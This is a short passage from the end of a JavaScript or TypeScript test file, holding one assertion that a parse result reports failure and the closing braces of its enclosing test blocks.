			expect(parsed.success).toBe(false);
		});
	});
});
